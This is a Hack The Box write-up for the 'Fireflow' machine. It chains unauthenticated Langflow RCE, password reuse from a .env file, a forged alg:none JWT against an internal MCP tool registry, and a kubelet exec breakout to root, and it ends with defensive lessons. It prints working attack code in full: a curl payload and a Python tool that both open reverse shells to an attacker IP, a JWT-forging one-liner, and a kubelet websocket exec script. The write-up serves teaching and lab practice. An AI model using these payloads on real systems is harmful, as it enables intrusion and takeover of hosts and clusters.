---
title: "Fireflow"
date: 2026-09-26
os: Linux
difficulty: Medium
tags: [langflow, unauthenticated-rce, jwt-alg-none, kubernetes, kubelet, privilege-escalation]
summary: "Unauthenticated RCE in a Langflow-based AI agent, a JWT alg:none bypass against an internal MCP Tool Registry, and a kubelet exec breakout to root via a privileged node-exporter pod."
platform: HTB
---

[Fireflow](https://app.hackthebox.com/machines/Fireflow?tab=play_machine)

This box is a three-stage chain: an unauthenticated RCE in a Langflow-based AI agent platform, a JWT signature bypass against an internal "MCP Tool Registry", and finally a Kubernetes kubelet abuse to break out to the host as root.

---

## Reconnaissance

First we ping the box to make sure it's up before doing anything else.

![](/assets/machines/fireflow/pasted-image-20260925205919.png)

Connectivity confirmed, so we run a full TCP sweep to see what's exposed:

```bash
nmap -p- --open -Pn -n --min-rate=5000 fireflow.htb -oN ports
```

![](/assets/machines/fireflow/pasted-image-20260925210600.png)

Only two ports open: 22 (SSH) and 443 (HTTPS). Small attack surface, so the web app is the likely way in. We run a version/script scan against those two:

```bash
nmap -p22,443 -sCV --min-rate=5000 -Pn -n fireflow.htb -oG AllInfo
```

![](/assets/machines/fireflow/pasted-image-20260925211211.png)

SSH is OpenSSH 9.6p1 on Ubuntu, up to date. Port 443 is Nginx with a self-signed cert, and the cert is the interesting part: the Subject Alternative Name lists `*.fireflow.htb`, a wildcard. That points to subdomains we haven't found yet.

---

## Enumeration

We run whatweb on the main site for more fingerprinting:

```bash
whatweb https://fireflow.htb/
```

![](/assets/machines/fireflow/pasted-image-20260925211744.png)

It confirms Nginx, and it leaks an `X-Frame-Options: ALLOW-FROM https://flow.fireflow.htb` header, so there is a second vhost, `flow.fireflow.htb`. We add it to `/etc/hosts` and browse over. The main site had a button linking out to an AI agent, which redirected us to `flow.fireflow.htb/playground/<uuid>` and opened a fresh chat session.

![](/assets/machines/fireflow/pasted-image-20260925212208.png)

![](/assets/machines/fireflow/pasted-image-20260925212851.png)

The landing page calls this the "Nightfall AI Agent", built on a "Flow engine" at version 1.8.2, with a public playground at flow ID `7d84d636-af65-42e4-ac38-26e867052c25`. That version number was worth searching on, and "Flow engine" is just the operator's internal name for **Langflow**.

---

## Foothold: unauthenticated RCE in Langflow (`build_public_tmp`)

A quick search turned up a public writeup/PoC for an unauthenticated RCE in Langflow's public flow-building endpoint.

![](/assets/machines/fireflow/pasted-image-20260925212956.png)

The root cause, from the advisory:

> The `POST /api/v1/build_public_tmp/{flow_id}/flow` endpoint allows building public flows without requiring authentication. When the optional `data` parameter is supplied, the endpoint uses attacker-controlled flow data (containing arbitrary Python code in node definitions) instead of the stored flow data from the database. This code is passed to `exec()` with zero sandboxing, resulting in unauthenticated remote code execution.

In short: the endpoint is meant to be public so visitors can run pre-approved public flows without logging in. The problem is it never checks whether the `data` you send in the request body matches what's stored for that flow ID. If you send your own `data`, the server builds and executes your flow instead, and "building" a flow here just means `exec()`-ing whatever Python sits in a node's `code` field, with no sandbox. The advisory notes this is distinct from CVE-2025-3248, which only patched `/api/v1/validate/code`; the `build_public_tmp` path was never touched.

![](/assets/machines/fireflow/pasted-image-20260925213347.png)

The only prerequisite is a valid flow UUID, and we already have one from the playground URL (`7d84d636-af65-42e4-ac38-26e867052c25`). We adapt the PoC into a reverse shell payload: a single malicious `genericNode` whose `code` field imports `os` and fires a bash reverse shell before defining the dummy component the endpoint expects.

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  --data-binary @- <<'JSON'
{
  "data": {
    "nodes": [
      {
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x": 0, "y": 0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /dev/tcp/10.10.14.158/4444 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name = \"X\"\n    outputs = [Output(display_name=\"O\", name=\"o\", method=\"r\")]\n    def r(self) -> Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [
              {
                "types": ["Data"],
                "selected": "Data",
                "name": "o",
                "display_name": "O",
                "method": "r",
                "value": "__UNDEFINED__",
                "cache": true,
                "allows_loop": false,
                "tool_mode": false,
                "hidden": null,
                "required_inputs": null,
                "group_outputs": false
              }
            ],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }
    ],
    "edges": []
  }
}
JSON
```

We fire it off with a listener already running, and the shell lands almost instantly:

```bash
penelope -p 4444
```

![](/assets/machines/fireflow/pasted-image-20260925220209.png)

We are `www-data`, dropped into `/var/lib/langflow`:

![](/assets/machines/fireflow/pasted-image-20260925220348.png)

### From www-data to nightfall (reused `.env` password)

With a foothold as `www-data`, the next move is to look for credentials in config files. Self-hosted apps often leave the superuser password and secret key in a plaintext `.env` next to the app config. Langflow's docs point at a few standard locations, and `/etc/langflow/.env` was one of them:

![](/assets/machines/fireflow/pasted-image-20260925220817.png)

```bash
cat /etc/langflow/.env
```

![](/assets/machines/fireflow/pasted-image-20260925220927.png)

There it was: the Langflow superuser password, `n1ghtm4r3_b4_n1ghtf4ll`. The app's own superuser account is called `langflow`, but there's no matching Linux user. Checking `/etc/passwd` instead, there is a local user called `nightfall`, which matches the AI agent's "Nightfall" branding. People reuse passwords across the app and the OS more often than they should, so we try it:

![](/assets/machines/fireflow/pasted-image-20260925221258.png)

```bash
su nightfall
```

![](/assets/machines/fireflow/pasted-image-20260925221346.png)

It worked: the app's superuser password was reused as `nightfall`'s system password. User flag, right there:

![](/assets/machines/fireflow/pasted-image-20260925221513.png)

![](/assets/machines/fireflow/pasted-image-20260925221550.png)

---

## Privilege escalation: kubelet exec breakout (via forged `alg:none` JWT + MCP RCE)

### A hidden `.mcp` folder, and a second set of credentials

Looking around `nightfall`'s home directory, there is an odd hidden folder: `.mcp`.

![](/assets/machines/fireflow/pasted-image-20260925221819.png)

```bash
cat ~/.mcp/config.json
```

Inside is a config pointing at an internal service on port 30080, plus a second set of credentials:

```json
{
  "server": "http://10.129.107.225:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

We query the version endpoint to see what this service is:

```bash
curl -s http://127.0.0.1:30080/api/v1/version | jq
```

![](/assets/machines/fireflow/pasted-image-20260925222017.png)

It calls itself an "MCP AI Tool Registry" (v0.1.0), an internal service for registering and invoking tools the AI agent can call. The useful part is the auth block in the same response: it issues JWTs, and it lists both `HS256` and `none` as supported signing algorithms. `alg: none` means the server will accept a token with an empty signature as valid, because the JWT config does not restrict the acceptable algorithm set.

First we authenticate normally with the leaked creds, to see what a legit token looks like:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/auth \
  -H "Content-Type: application/json" \
  -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925222456.png)

We get back a normal, signed `langflow-bot` token, but not an admin role. Instead of trying to crack the HS256 secret, we use the `alg: none` weakness: we craft our own header and payload, set the role to `admin`, base64url-encode both, and leave the signature segment empty.

```bash
header=$(printf '{"alg":"none","typ":"JWT"}' | base64 | tr '+/' '-_' | tr -d '=')
payload=$(printf '{"sub":"langflow-bot","role":"admin"}' | base64 | tr '+/' '-_' | tr -d '=')
forged="$header.$payload."
echo "$forged"
```

![](/assets/machines/fireflow/pasted-image-20260925222803.png)

(I had Claude help me put this together, since I'd never hand-forged a `none`-alg JWT before. It's a two-line base64 job once you know the format: header, payload, and a trailing dot with nothing after it for the empty signature.)

We send the forged token to the authenticated tools listing endpoint, and it works. The server accepts a self-signed, unsigned token as if it had verified it:

```bash
curl -s http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" | jq
```

![](/assets/machines/fireflow/pasted-image-20260925223007.png)

With an admin-scoped token, the next move is to register a new tool. The service's own `openapi.json` documents its API:

```bash
curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" | jq '.paths."/api/v1/tools".post'
```

![](/assets/machines/fireflow/pasted-image-20260925223449.png)

```bash
curl -s http://127.0.0.1:30080/openapi.json -H "Authorization: Bearer $forged" | jq '.components.schemas.ToolRegisterRequest'
```

![](/assets/machines/fireflow/pasted-image-20260925223559.png)

The `ToolRegisterRequest` schema takes a `name`, `description`, and a `code` field. Given what we saw in Langflow, the `code` field is probably executed the same way, unsandboxed. We register a tool that runs `id` via `os.system()`:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"name":"pwnd2","description":"HACK","code":"import os; os.system(\"id\")"}' | jq
```

It registers fine, but calling it fails:

```bash
curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwnd2","arguments":{}}}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925224258.png)

It returns a traceback: `TypeError: expected str, bytes or os.PathLike object, not builtin_function_or_method`. The tool runner doesn't like a bare `os.system()` call returning `None`; it wants the tool to return a string. We switch to `os.popen(...).read()`, which returns the command output as text, and that fixes it:

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"name":"pwnd","description":"HACK","code":"import os; print(os.popen(\"id\").read())"}' | jq

curl -s -X POST http://127.0.0.1:30080/mcp \
  -H "Authorization: Bearer $forged" -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"tools/call","params":{"name":"pwnd","arguments":{}}}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925224554.png)

`uid=1000(mcp) gid=1000(mcp)`: code execution confirmed inside the MCP service. From there we register one more tool, a reverse shell (built with revshells.com's Python payload), to get an interactive session instead of one-shot commands:

![](/assets/machines/fireflow/pasted-image-20260925225714.png)

```bash
curl -s -X POST http://127.0.0.1:30080/api/v1/tools -H "Authorization: Bearer $forged" -H "Content-Type: application/json" -d '{
"name":"revshell",
"description":"pwnd",
"code":"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.158\",4445));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")"}' | jq
```

![](/assets/machines/fireflow/pasted-image-20260925225820.png)

![](/assets/machines/fireflow/pasted-image-20260925225833.png)

Invoking that tool through `/mcp` drops us into an interactive shell as `mcp`, on a different host from the main Fireflow box. This service runs in its own container.

### Breaking out to the node through the kubelet API

Looking around the new shell, it's clearly a Kubernetes pod rather than a plain VM: there's a `/var/run/secrets/kubernetes.io/serviceaccount` directory with a service account token, namespace file, and CA cert, the standard mount every pod gets.

![](/assets/machines/fireflow/pasted-image-20260925234519.png)

```bash
ls /var/run/secrets/kubernetes.io/serviceaccount
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
```

I got stuck here for a while and checked the official writeup to get my bearings. The piece I was missing: a pod's service account token isn't just for talking to the Kubernetes API server, it's also a valid bearer token against the kubelet's own HTTPS API on port 10250, directly on the node. Depending on the cluster's RBAC, that kubelet API can let you list and `exec` into any pod scheduled on that node, not just your own, which sidesteps the namespace-scoped limits you'd expect.

We query the kubelet's `/pods` endpoint with the stolen token to see everything running on the node, looking for anything privileged or with a sensitive hostPath mount:

```bash
curl -sk -H "Authorization: Bearer $TOKEN" "https://10.129.107.225:10250/pods" \
  | python3 -c "import sys,json;d=json.load(sys.stdin);[print(i['metadata']['namespace'],i['metadata']['name'],c['name'],'priv=',c.get('securityContext',{}).get('privileged'),[v['hostPath']['path'] for v in i['spec'].get('volumes',[]) if 'hostPath' in v]) for i in d['items'] for c in i['spec']['containers']]"
```

![](/assets/machines/fireflow/pasted-image-20260926000841.png)

One pod stands out: `prometheus-prometheus-node-exporter-nmntq` in the `monitoring` namespace, running `privileged=True` with hostPath mounts of `/proc`, `/sys`, and `/`. Node-exporter needs host-level access to report system metrics, but mounting the entire host root filesystem into a privileged container means anyone who can exec into that pod has root on the node, since the host's `/` is reachable inside the container.

Hitting the kubelet's `/exec` endpoint needs a WebSocket connection with the `v4.channel.k8s.io` subprotocol instead of a plain HTTP call, so I had Claude help me put together a small script to drive that:

```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets
NODE = "10.129.107.225"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'
async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={p}" for p in cmd_parts)
    url = f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}?output=1&error=1&{args}"
    async with websockets.connect(url, ssl=ctx, additional_headers={"Authorization": f"Bearer {TOKEN}"}, subprotocols=["v4.channel.k8s.io"], open_timeout=10) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace")); sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass
asyncio.run(ws_exec(COMMAND.split()))
```

```bash
python3 /tmp/kube_exec.py "id"
```

![](/assets/machines/fireflow/pasted-image-20260926001739.png)

`uid=0(root)`: the service account from the low-privilege `mcp` pod had enough kubelet-level access to exec into a privileged pod running as root on the node. From there the host's root filesystem is reachable through the hostPath mount, so we read the root flag.

![](/assets/machines/fireflow/pasted-image-20260926114721.png)

Machine pwned.

---

## Reflection

Any one of these being fixed would have broken the chain:

- The `build_public_tmp` endpoint trusted client-supplied flow data instead of the stored, vetted flow. Public endpoints should never execute attacker-controlled code: if the feature is "run this pre-approved public flow", the server must ignore any `data` the client sends and use what's in the database.
- Secrets in `.env` were reused as real system account passwords. The Langflow superuser password and the `nightfall` Linux password were identical. Application secrets and OS credentials should never share a value.
- The MCP Tool Registry advertised and accepted `alg: none` JWTs. The signing algorithm must be pinned server-side and enforced on verification, never trusted from the token header. `none` should never be in a production supported-algorithms list.
- An internal admin API let any authenticated user register arbitrary executable "tools". Registering a tool was the same as uploading a webshell. Tool code should run in a real sandbox, not a bare `exec`/`os.popen` in the service's own process.
- A pod's service account token could authenticate directly to the kubelet API and exec into pods outside its own scope, and a monitoring pod (node-exporter) was both privileged and had the entire host filesystem mounted in. Kubelet authorization should be locked down, and `hostPath: /` on a privileged container should never be necessary, even for a metrics exporter.
